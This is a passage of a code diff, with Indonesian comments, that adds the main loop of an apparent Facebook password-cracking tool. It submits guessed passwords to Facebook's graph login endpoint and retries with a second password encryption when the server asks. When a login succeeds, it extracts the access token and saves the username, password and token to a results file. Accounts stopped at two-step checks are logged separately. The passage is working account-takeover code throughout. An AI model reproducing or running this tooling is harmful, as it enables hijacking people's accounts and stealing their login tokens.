+                headers["Content-Length"] = str(len(compressed_data))
+
+                response = session.post(
+                    "https://b-graph.facebook.com/graphql",
+                    data=compressed_data,
+                    headers=headers,
+                    timeout=30
+                )
+                resp_json = response.json()
+
+                # Ekstrak bloks_action
+                bloks_str = None
+                try:
+                    action = resp_json.get('data', {}).get('fb_bloks_action', {}).get('root_action', {}).get('action', {})
+                    bundle = action.get('action_bundle', {})
+                    bloks_str = bundle.get('bloks_bundle_action', '')
+                    if bloks_str:
+                        bloks_str = bloks_str.replace('\\', '')
+                except:
+                    pass
+
+                # Jika tidak ada bloks_str atau terjadi encryption_retry, fallback ke MSGR
+                if not bloks_str or 'encryption_retry' in bloks_str:
+                    rprint('[bold yellow]encryption_retry detected, fallback to #PWD_MSGR...[/]', end='\r')
+                    encrypted_pass = Encrypt_PWD._PWD_MSGR(pwd)
+                    # Update password di payload (ulangi request)
+                    client_input_params["password"] = encrypted_pass
+                    params_dict["client_input_params"] = client_input_params
+                    params_json = json.dumps(params_dict, separators=(',', ':'), ensure_ascii=False)
+                    params_string = f"{{params:{params_json}}}"
+                    variables["params"]["params"] = params_string
+                    payload["variables"] = json.dumps(variables, separators=(',', ':'))
+                    data_str = urlencode(payload)
+                    compressed_data = gzip.compress(data_str.encode('utf-8'))
+                    headers["Content-Length"] = str(len(compressed_data))
+                    # Generate trace_id baru
+                    trace_id = str(uuid.uuid4())
+                    headers["x-fb-ta-logging-ids"] = f"graphql:{trace_id}"
+                    payload["client_trace_id"] = trace_id
+                    response = session.post(
+                        "https://b-graph.facebook.com/graphql",
+                        data=compressed_data,
+                        headers=headers,
+                        timeout=30
+                    )
+                    resp_json = response.json()
+                    # Ekstrak ulang
+                    try:
+                        action = resp_json.get('data', {}).get('fb_bloks_action', {}).get('root_action', {}).get('action', {})
+                        bundle = action.get('action_bundle', {})
+                        bloks_str = bundle.get('bloks_bundle_action', '')
+                        if bloks_str:
+                            bloks_str = bloks_str.replace('\\', '')
+                    except:
+                        pass
+
+                if bloks_str:
+                    if 'session_key' in bloks_str or 'EAAAAU' in bloks_str:
+                        log['success'] += 1
+                        token_match = re.search(r'"access_token":"([^"]+)"', bloks_str)
+                        token = token_match.group(1) if token_match else "UNKNOWN"
+                        rprint(Panel(Panel(f"[bold green][+] Username : {user}\n[+] Password : {pwd}\n[+] Access Token : {token}\n[+] User Agent : {ua_str}[/bold green]", style='bold green'), width=80, style='bold bright_black', title='[bold green]Login-Success[/bold green]'))
+                        open(file_result["success"], 'a', encoding='utf-8').write(f"{user}|{pwd}|{token}\n")
+                        break
+                    elif 'redirect_login_challenges' in bloks_str or 'com.bloks.www.ap.two_step_verification.entrypoint_async' in bloks_str:
+                        log['checkpoint'] += 1
+                        rprint(Panel(Panel(f"[bold yellow][+] Username : {user}\n[+] Password : {pwd}\n[+] User Agent : {ua_str}[/bold yellow]", style='bold yellow'), width=80, style='bold bright_black', title='[bold yellow]Login-Checkpoint[/bold yellow]'))
+                        open(file_result['checkpoint'], 'a', encoding='utf-8').write(f"{user}|{pwd}\n")
+                        break
+                    else:
+                        # gagal, lanjut password berikutnya
+                        continue
+
+            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
+                KenXin_Warning('Koneksi Internet Error!')
+                time.sleep(5)
+                continue
+            except Exception as e:
+                # Jika ada error lain, lanjut ke password berikutnya
+                continue
         log['loop'] += 1
 
 # ==================== MAIN ====================
